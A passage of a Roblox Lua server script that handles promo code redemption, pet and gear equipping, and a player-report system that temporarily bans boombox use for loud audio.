			for _,itemid in pairs(IDtable) do
				local marker = Instance.new("StringValue",data.Objects)
				marker.Name = itemid
			end
			return true
		else
			game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"An error occurred while awarding items. Please try again.")
		end
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. Your data will not be modified during this session.")
	end
end

game.ReplicatedStorage.RemoteFunctions.RedeemTwitterCode.OnServerInvoke = function(plr,code)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data then
		
		local obj 
		for _,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
			if v:FindFirstChild("TwitterCode") and string.lower(v.TwitterCode.Value) == string.lower(code) then --code correct
				obj = v
			end
		end
		if obj == nil then
			return false,"Error: You have entered an incorrect code. Please enter a valid code that was given away in the RHS Fan Club."
		end
		
		local itemname = string.sub(obj.Name:match("_.+"),2)
		
		for _,v in pairs(data.Objects:GetChildren()) do
			if tonumber(v.Name) == obj.ItemID.Value then
				return false,"You've already redeemed this code for '"..itemname.."'!"
			end
		end
		
		coroutine.resume(coroutine.create(processAwardItem),plr,obj.ItemID.Value)
		return true,"Successfully redeemed code for '"..itemname.."'!"
		
	end
end

game.ServerStorage.RemoteFunctions.SpawnPet.Event:connect(function(plr,id)
	local petdata
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	for _,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
		if v.Name:match("pets_") and v.ItemID.Value == id then
			petdata = v
		end
	end
	if petdata and plr.Parent ~= nil and data and data.Objects:FindFirstChild(petdata.ItemID.Value) then
		game.ReplicatedStorage.RemoteFunctions.CompanionChanged:FireAllClients(plr,id,true)
	end
end)

game.ServerStorage.RemoteFunctions.RemovePet.Event:connect(function(plr)
	game.ReplicatedStorage.RemoteFunctions.CompanionChanged:FireAllClients(plr,nil,false)
end)

game.ServerStorage.RemoteFunctions.CheckForCompanion.OnInvoke = function(plr)
	if plr and plr:FindFirstChild("SelectedPet") then
		return plr.SelectedPet.Value
	end
end

game.ReplicatedStorage.RemoteFunctions.EquipPet.OnServerInvoke = function(plr,id)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data then
		local selectedobject = plr:FindFirstChild("SelectedPet")
		if selectedobject then
			if id == selectedobject.Value then
				selectedobject.Value = 0
				game.ServerStorage.RemoteFunctions.RemovePet:Fire(plr)
				return true
			else
				local object
				for _,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
					if v.ItemID.Value == id and v.Name:match("pets_") then
						object = v
					end
				end
				if object then
					selectedobject.Value = object.ItemID.Value
					game.ServerStorage.RemoteFunctions.SpawnPet:Fire(plr,id)
					return true
				end
			end
		end
	end
end


local gearusers = {}

local boombox_flags = {}
local boombox_bans = {}

function FlagBoomboxSong(flagger, plr)
	coroutine.resume(coroutine.create(function()
		if plr and flagger and boombox_bans[plr.Name] == nil then
			if boombox_flags[plr.Name] == nil then
				boombox_flags[plr.Name] = {}
			end
			if boombox_flags[plr.Name][flagger.Name] == nil then
				boombox_flags[plr.Name][flagger.Name] = true
				if flagger.Name == plr.Name or #boombox_flags[plr.Name] >= 8 then
					--ban from using boombox
					boombox_bans[plr.Name] = true
					local char = plr.Character
					local bp = plr.Backpack
					if char then
						for _,v in pairs(char:GetChildren()) do
							if v:IsA("Tool") and v.Name:match("Boombox") then
								v:Destroy()
							end
						end
					end
					if bp then
						for _,v in pairs(char:GetChildren()) do
							if v:IsA("Tool") and v.Name:match("Boombox") then
								v:Destroy()
							end
						end
					end
					game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr, "Warning: Do not play extremely loud audio! Please preview your songs before playing them to make sure they are not loud or distorted.", true)
					wait(185)
					boombox_bans[plr.Name] = nil
				else
					--flag expires after a few mins
					wait(180)
					boombox_flags[plr.Name][flagger.Name] = nil
				end
			end
		end
	end))
end

game.ReplicatedStorage.RemoteFunctions.FlagBoomboxSong.OnServerEvent:connect(function(flagger, target)
	FlagBoomboxSong(flagger, target)
end)

game.Players.ChildAdded:connect(function(plr)
	gearusers[plr.Name] = {}
	plr.CharacterAdded:connect(function()
		gearusers[plr.Name] = {}
	end)
end)

game.Players.ChildRemoved:connect(function(plr)
	gearusers[plr.Name] = nil
end)

function addGearToTable(plr,id)
	table.insert(gearusers[plr.Name],id)
end

function checkIfGearAvailable(plr,id)
	for i,v in pairs(gearusers[plr.Name]) do
		if v == id then
			return false
		end
	end
	addGearToTable(plr,id)
	return true
end

--debuggin purposes
game.ServerStorage.RemoteFunctions.PrintBannedBoomboxes.Event:connect(function()
	for _,v in pairs(boombox_bans) do
		print(v)
	end
end)

game.ReplicatedStorage.RemoteFunctions.RequestToEquipGear.OnServerInvoke = function(plr,id)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data and plr:FindFirstChild("Backpack") and plr.Character then
		local human = plr.Character:FindFirstChild("Humanoid")
		if data.Objects:FindFirstChild(id) and human and human.Health > 0 then
			if checkIfGearAvailable(plr,id) == true then
			
				for _,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
					if v.ItemID.Value == id and v.Name:match("gear_") then
						
						if (v.Name:match("Boombox")) then
							for x,_ in pairs(boombox_bans) do
								if plr.Name == x then
									return false,"You have been temporarily restricted due to playing very loud audio."
								end
							end
						end
						
						for _,tool in pairs(v:GetChildren()) do
							if tool:IsA("Tool") then
								local cl = tool:clone()
								cl.Parent = plr.Backpack
								human:EquipTool(cl)
								return true
							end
						end
					end
				end
			
			else
				return false,"You've already equipped this gear. Respawn to get another copy."
			end
		else
			return false,"Looks like you got rekt while trying to equip this. RIP."
		end
	end
end
